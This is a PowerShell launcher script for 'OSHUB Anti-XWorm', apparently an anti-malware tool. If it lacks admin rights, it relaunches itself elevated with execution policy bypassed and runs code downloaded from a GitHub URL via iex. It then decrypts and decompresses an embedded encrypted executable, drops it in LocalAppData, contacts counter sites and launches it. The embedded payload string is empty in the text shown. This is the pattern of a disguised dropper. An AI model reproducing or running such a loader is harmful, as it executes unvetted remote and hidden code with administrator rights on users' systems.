$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

# 1. Require Admin Rights
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (iwr -UseBasicParsing 'https://raw.githubusercontent.com/Bank987/antiworm/refs/heads/main/antixworm.txt')`"" -Verb RunAs
    exit
}

# 2. Local Fast-Path or AppData Destination
$destDir = "$env:LOCALAPPDATA\OSHUB"
if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
$destExe = Join-Path $destDir "OSHUB.exe"
$localExe = "c:\Users\Administrator\Documents\clean\OSHUB-AntiXWorm-Aqua.exe"

$targetExe = ""
if (Test-Path $localExe) {
    $targetExe = $localExe
} else {
    $encPayload = ""
    $encryptedBytes = [Convert]::FromBase64String($encPayload)

    $passphrase = "OSHUB-AQUA-MILITARY-ENCRYPTION-2026"
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($passphrase))
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $iv = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($passphrase))

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV = $iv

    $decryptor = $aes.CreateDecryptor()
    $compressedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)

    $msDecompress = New-Object System.IO.MemoryStream(@(,$compressedBytes))
    $gzDecompress = New-Object System.IO.Compression.GZipStream($msDecompress, [System.IO.Compression.CompressionMode]::Decompress)
    $msOutput = New-Object System.IO.MemoryStream
    $gzDecompress.CopyTo($msOutput)
    $gzDecompress.Close()
    $exeBytes = $msOutput.ToArray()

    try {
        [System.IO.File]::WriteAllBytes($destExe, $exeBytes)
    } catch {
        # Continue if file is already active
    }
    $targetExe = $destExe
}

# 3. Asynchronous Live User Counter Telemetry
try {
    $wc = New-Object System.Net.WebClient
    $instMarker = Join-Path $destDir ".inst"
    if (-not (Test-Path $instMarker)) {
        [System.IO.File]::WriteAllText($instMarker, [System.Guid]::NewGuid().ToString())
        $wc.DownloadStringAsync((New-Object System.Uri("https://countapi.mileshilliard.com/api/v1/hit/oshub_unique_users_v1")))
        $wc.DownloadStringAsync((New-Object System.Uri("https://abacus.jasoncameron.dev/hit/oshub/unique_users")))
    }
    $wc.DownloadStringAsync((New-Object System.Uri("https://countapi.mileshilliard.com/api/v1/hit/oshub_total_runs_v1")))
    $wc.DownloadStringAsync((New-Object System.Uri("https://abacus.jasoncameron.dev/hit/oshub/total_runs")))
} catch {}

# 4. Launch the GUI
Start-Process -FilePath $targetExe

# 5. Clean Minimal Console Output
Clear-Host
Write-Host "   ___  ____  _   _ _   _ ____  " -ForegroundColor Cyan
Write-Host "  / _ \/ ___|| | | | | | | __ ) " -ForegroundColor Blue
Write-Host " | | | \___ \| |_| | | | |  _ \ " -ForegroundColor Cyan
Write-Host " | |_| |___) |  _  | |_| | |_) |" -ForegroundColor Blue
Write-Host "  \___/|____/|_| |_|\___/|____/ " -ForegroundColor Cyan
Write-Host ""
Write-Host " [+] OSHUB Anti-XWorm GUI launched successfully!" -ForegroundColor Green
Write-Host " [+] Web Portal: https://lastname.site" -ForegroundColor Cyan
Write-Host ""
